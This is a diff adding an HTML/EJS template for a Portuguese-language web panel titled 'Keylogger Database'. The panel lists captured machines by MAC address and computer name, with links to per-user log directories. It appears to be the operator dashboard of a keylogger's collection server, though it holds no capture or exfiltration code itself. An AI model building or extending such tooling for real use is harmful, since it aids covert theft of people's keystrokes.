@@ -1,0 +1,60 @@
+<!doctype html>
+<html lang="pt-br">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link rel="stylesheet" href="css/vrtxkl.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+
+    <link rel="icon" href="/images/keyboard.png"> 
+    <title>Keylogger database</title>
+
+  </head>
+
+  <body class="d-flex flex-column min-vh-100 bg-dark text-white">
+    <header>
+      <nav class="navbar navbar-dark bg-dark shadow">
+        <a class="navbar-brand" href="">
+            <img src="images/logohackoonspace.png" width="30" height="30" class="d-inline-block align-top" alt="" loading="lazy">
+            Keylogger Database
+        </a>
+        <form class="form-inline">
+          <input class="form-control mr-sm-2 bg-dark text-white-50 border border-info" type="search" id="inputData" placeholder="Buscar" aria-label="Buscar">
+          <input class="btn btn-info my-2 my-sm-0" type="button" id="searchBtn" value="Buscar">
+        </form>
+      </nav>
+    </header>
+
+    <main role="main" class="container">
+      <table id="tableData" class="table table-striped table-bordered table-dark table-hover mt-5">
+        <thead>
+          <tr>
+            <th scope="col">MAC Address</th>
+            <th scope="col">Computer Name</th>
+          </tr>
+        </thead>
+        <tbody id="tbodyData">
+          <%for(dir of dirlist) {%>
+              <tr class="macElement" data-href="user/<%=dir.userdir%>">
+                  <th scope="row"><%=dir.mac%></th>
+                  <td><%=dir.computer%></td>
+              </tr>
+          <%}%>
+        </tbody>
+      </table>
+    </main>
+
+    <footer class="footer mt-auto"> 
+      <div class="container">
+        <div class="footer-copyright text-center py-3 text-muted"> Todos direitos reservados © <a href="https://hackoonspace.com/" class="text-info">Hackoonspace</a> <a href="https://github.com/cavebran" class="text-muted">@cavebran</a> e <a href="https://github.com/luccamapt" class="text-muted">@luccamapt</a>.</div>
+      </div>
+    </footer>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+
+    <script src="js/vrtxkl.js"></script>
+  </body>
+</html>
